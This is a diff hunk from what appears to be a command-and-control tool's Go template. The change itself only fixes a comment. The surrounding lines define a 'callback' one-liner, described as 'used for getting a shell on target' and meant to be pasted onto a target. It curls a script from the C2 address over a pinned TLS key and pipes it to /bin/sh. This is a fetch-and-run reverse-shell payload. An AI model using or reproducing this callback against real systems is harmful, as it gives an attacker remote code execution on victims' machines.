@@ -20,7 +20,7 @@ curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.C2Addr | nodefaultport}
 {{  end -}}
 
 {{/* callback is a one-liner used for getting a shell on target.  It more or
-   * less sends the "script" subtemplate, below, to a shell.  This is the
+   * less sends the "script" subtemplate, above, to a shell.  This is the
    * one-liner one copy/pastes to a target. */}}
 {{- define "callback" -}}
 {{template "curl" .}}/{{.URLPaths.Script}} | /bin/sh
